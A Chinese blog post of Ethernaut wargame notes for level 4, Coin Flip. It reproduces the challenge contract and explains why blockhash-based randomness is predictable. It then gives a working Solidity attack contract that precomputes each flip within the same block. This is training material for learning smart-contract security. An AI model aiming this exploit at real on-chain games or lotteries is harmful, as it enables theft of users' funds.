---
title: Ethernaut 闯关笔记 第4关 Coin Flip
date: 2023-12-07 11:55:50
tags:
---


# 原始代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

翻硬币，以 `block.number` 为随机种子。

目标：连续猜对 10 次。

# 攻击思路

区块链是 Deterministic 的，不能够产生随机数。

在一个区块内， `block.number` 是一个公开且确定的值。

因此，可以考虑提前在本地计算出硬币将会出现的面。

# 攻击代码

因为所有的操作要在一个区块内完成，本关卡无法在控制台中逐个发送交易完成，需要写合约。

为了获取目标合约的接口，可以直接拷贝其源代码。

因为目标合约设计为一个区块内只能翻一次，否则就会 `revert` ，

所以手动调用 `run()` 十次，即可通关。

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

contract CoinFlip {

    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract CoinFlipHack{

    address immutable owner;
    address constant TARGET = 0x3A31B875ed14AAC78D56CAAA35544644C33A6952;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip target;

    constructor() {
        owner = msg.sender;
        target = CoinFlip(TARGET);
    }
    
    modifier onlyOwner(){
        if(msg.sender != owner){
            revert("Not Owner");
        }
        _;
    }

    function run() public onlyOwner{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
```
